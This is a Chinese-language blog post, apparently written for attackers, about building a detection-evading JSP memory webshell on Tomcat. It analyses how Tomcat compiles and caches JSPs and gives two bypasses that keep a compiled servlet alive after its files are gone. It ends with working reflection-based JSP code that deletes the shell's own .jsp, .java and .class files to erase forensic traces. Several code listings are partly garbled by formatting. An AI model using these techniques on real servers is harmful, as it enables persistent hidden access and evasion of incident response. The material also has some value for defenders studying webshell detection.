## 前言

最近在研究webshell免杀的问题，到了内存马免杀部分发现传统的Filter或者Servlet查杀手段比较多，不太容易实现免杀，比如有些工具会将所有注册的`Servlet`和`Filter`拿出来，排查人员仔细一点还是会被查出来的，所以  
我们要找一些其他方式实现的内存马。比如我今天提到的JSP的内存马（虽然本质上也是一种Servlet类型的马） 。

## JSP加载流程分析

`JspServletWrapper.service`主要做了如下操作。

*   根据jsp生成java文件并编译为class
    
*   将class文件注册为servlet
    
*   调用`servlet.service`方法完成调用
    

JSP生成java和class文件主要由下面的代码完成，这里的`options.getDevelopment()`代表的是部署模式。

tomcat的开发模式和生产模式的设定是通过conf文件夹下面的web.xml文件来配置的。

> 在开发模式下，容器会经常检查jsp文件的时间戳来决定是否进行编译，如果jsp文件的时间戳比对应的.class文件的时间戳晚就证明jsp又进行了修改，需要再次编译，但是不断地进行时间戳的比对开销很大，会影响系统性能，而在生产模式下系统不会经常想的检查时间戳。所以一般在开发过程中使用开发模式，这样可以在jsp修改后再次访问就可以见到修改后的效果非常方便，而系统上线之后就要改为生产模式，虽然生产模式下会导致jsp的修改需要重启服务器才可以生效，但是上线后的改动较少而且性能很重要。

默认Tomcat是以开发模式运行的。一般我们遇到的Tomcat都是以开发模式运行的，所以会由`JspCompilationContext#compile`进行编译。

```

3.  `                    if (options.getDevelopment() || mustCompile) {`

5.  `                        mustCompile = false;`

下面我们分析如何将生成的class文件注册为Servlet。首先判断`theServlet`是否为空，如果为空则表示还没有为JSP文件创建过Servlet，则通过`InstanceManager.newInstance`创建Servlet,并将创建的Servlet保存在`theServlet`属性中。

```
1.  `public Servlet getServlet() throws ServletException {`
    
2.  `// getReloadInternal是否Reload默认为False，也就是说如果theServlet为true就会直接返回。`

4.  `            synchronized (this) {`
    
5.  
    
6.  `                if (getReloadInternal() || theServlet == null) {`
    
7.  `             //如果theServlet中有值则销毁该Servlet.`
    
8.  `                    destroy();`
    
9.  `                    final Servlet servlet;`
    
10.  `                    try {`
     
11.  `                        //创建Servlet实例`
     
12.  `                        InstanceManager instanceManager = InstanceManagerFactory.getInstanceManager(config);`
     
13.  `                        servlet = (Servlet) instanceManager.newInstance(ctxt.getFQCN(), ctxt.getJspLoader());`
     
14.  `                    } catch (Exception e) {`
     
15.  `                        Throwable t = ExceptionUtils`
     
16.  `                                .unwrapInvocationTargetException(e);`
     
17.  `                        ExceptionUtils.handleThrowable(t);`
     
18.  `                        throw new JasperException(t);`
     
19.  `                    }`
     
20.  `                //初始化servlet`
     
21.  `                    servlet.init(config);`
     
22.  `                    if (theServlet != null) {`
     
23.  `                        ctxt.getRuntimeContext().incrementJspReloadCount();`
     
24.  `                    }`

26.  `                    theServlet = servlet;`
     
27.  `                    reload = false;`
     
28.  `                }`

```

下面有一个小知识点，`theServlet`是由`volatile`修饰的，在不同的线程之间可以共享，再通过`synchronized (this)`加锁，也就是说无论我们请求多少次，无论是哪个线程处理，只要`this`是一个值，那么`theServlet`属性的值是一样的，而`this`就是当前的`jspServletWrapper`，我们访问不同的JSP也是由不同的`jspServletWrapper`处理的。

最后就是调用`servlet.service`方法完成请求处理。

## 内存驻留分析

上面我们已经分析完了JSP的处理逻辑，要想要完成内存驻留，我们要解决下面的问题。

*   请求后不去检查JSP文件是否存在
    
*   theServlet中一直保存着我们的servlet，当我们请求对应url还能交给我们的servlet处理
    

第二个问题比较容易，`theServlet`能否获取到Servlet或者获取到哪个Servlet和`jspServletWrapper`是有关的，而在`JspServlet#serviceJspFile`中，如果我们已经将Servlet注册过，可以根据url从`JspRuntimeContext`中获取得到对应的`jspServletWrapper`。

### 绕过方法一

下面解决`请求后不去检查JSP文件是否存在`问题，首先我想绕过下面的判断,如果我们能让`options.getDevelopment()`返回false就不会进入`complie`部分。

那么经过修改后会不会导致后来上传的jsp文件都无法执行的问题呢？

不会，因为每一个JSP文件，只有已经编译并且注册为Servlet后，`mustCompile`属性才会为False，默认为True，并且`mustCompile`也是由`volatile`修饰并且在`synchronized`加锁的代码块中，只有同一个`jspServletWrapper`的`mustCompile`的修改在下次请求时还有效。当然也不是说完全没有影响，  
如果我们想修改一个已经加载为`Servlet` 的JSP文件，即使修改了也不会生效。

```
1.  `if (options.getDevelopment() || mustCompile) {`
    
2.  `                synchronized (this) {`
    
3.  `                    if (options.getDevelopment() || mustCompile) {`
    
4.  `                        ctxt.compile();`
    
5.  `                        mustCompile = false;`
    
6.  `                    }`
    
7.  `                }`
    
```

### 绕过方法二

下一个我们有机会绕过的点在compile中，如果我们能让`isOutDated`返回false，也可以达到绕过的目的。

```
1.  `public void compile() throws JasperException, FileNotFoundException {`
    
2.  `        createCompiler();`
    
3.  `        if (jspCompiler.isOutDated()) {`
    
4.  `         ...`
    
5.  `        }`
    
6.  `    }`
    
```

注意看下面的代码,在`isOutDated`中，当满足下面的条件则会返回false。`jsw`中保存的是`jspServletWarpper`对象，所以是不为null的，并且`modificationTestInterval`默认值是4也满足条件，所以我们现在要做的就是让`modificationTestInterval*1000`大于`System.currentTimeMillis()`,所以  
只要将`modificationTestInterval` 修改为一个比较大的值也可以达到绕过的目的。

```
1.  `public boolean isOutDated(boolean checkClass) {`
    
2.  `        if (jsw != null`
    
3.  `                && (ctxt.getOptions().getModificationTestInterval() > 0)) {`

5.  `                    + (ctxt.getOptions().getModificationTestInterval() * 1000) > System.currentTimeMillis()) {`
    
6.  `                return false;`
    
7.  `            }`
    
8.  `        }`
    
```

```

## 自删除

上面只是分析了如何让我们的JSP在删除了`JSP\java\Class`文件后还能访问，下面我们分析如何在`JSP`中实现删除`JSP\java\Class`文件，在`JspCompilationContext`保存着JSP编译的上下文信息，我们可以从中拿到`java/class`的绝对路径。

![](../Images/bb56e3144561711364b832a06da37d76.png)

而`JspCompilationContext`对象保存在`JspServletWrapper`中，所以要先获取`JspServletWrapper`。

```
1.  `public JspServletWrapper(ServletConfig config, Options options,`
    
2.  `            String jspUri, JspRuntimeContext rctxt) {`
    
3.  `        ...`
    
4.  `        ctxt = new JspCompilationContext(jspUri, options,`
    
5.  `                                         config.getServletContext(),`
    
6.  `                                         this, rctxt);`
    
7.  `    }`
    
```

`request.request.getMappingData().wrapper.instance.rctxt.jsps.get("/jsp.jsp")`

![](../Images/778f9a72ea5f9e41161f5aa05e69b921.png)

下面是代码实现

```
1.  `<%`
    
2.  `    //从request对象中获取request属性`
    
3.  `    Field requestF = request.getClass().getDeclaredField("request");`
    
4.  `    requestF.setAccessible(true);`
    
5.  `    Request req = (Request) requestF.get(request);`
    
6.  `    //获取MappingData`
    
7.  `    MappingData mappingData = req.getMappingData();`
    
8.  `    //获取Wrapper，这里的Wrapper是StandrardWrapper`
    
9.  `    Field wrapperF = mappingData.getClass().getDeclaredField("wrapper");`
    
10.  `    wrapperF.setAccessible(true);`
     
11.  `    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);`
     
12.  `      //获取jspServlet对象`
     
13.  `    Field instanceF = wrapper.getClass().getDeclaredField("instance");`
     
14.  `    instanceF.setAccessible(true);`
     
15.  `    Servlet jspServlet = (Servlet) instanceF.get(wrapper);`
     
16.  `    //获取rctxt属性`
     
17.  `    Field rctxt = jspServlet.getClass().getDeclaredField("rctxt");`
     
18.  `    rctxt.setAccessible(true);`
     
19.  `    JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);`
     
20.  `    //获取jsps属性内容`
     
21.  `    Field jspsF = jspRuntimeContext.getClass().getDeclaredField("jsps");`
     
22.  `    jspsF.setAccessible(true);`
     
23.  `    ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);`
     
24.  `    //获取对应的JspServletWrapper`
     
25.  `    JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());`
     
26.  `    //获取ctxt属性保存的JspCompilationContext对象`
     
27.  `    Field ctxt = jsw.getClass().getDeclaredField("ctxt");`
     
28.  `    ctxt.setAccessible(true);`
     
29.  `    JspCompilationContext jspCompContext = (JspCompilationContext) ctxt.get(jsw);`
     
30.  `    File targetFile;`
     
31.  `    targetFile = new File(jspCompContext.getClassFileName());//删掉jsp的.class`
     
32.  `    targetFile.delete();`
     
33.  `    targetFile = new File(jspCompContext.getServletJavaFileName());//删掉jsp的java文件`
     
34.  `    targetFile.delete();`
     
35.  `    //删除JSP文件`
     
36.  `     String __jspName = this.getClass().getSimpleName().replaceAll("_", ".");`
     
37.  `    String path=application.getRealPath(__jspName);`
     
38.  `    File file = new File(path);`
     
39.  `    file.delete();`
     
40.  `%>`
     
```
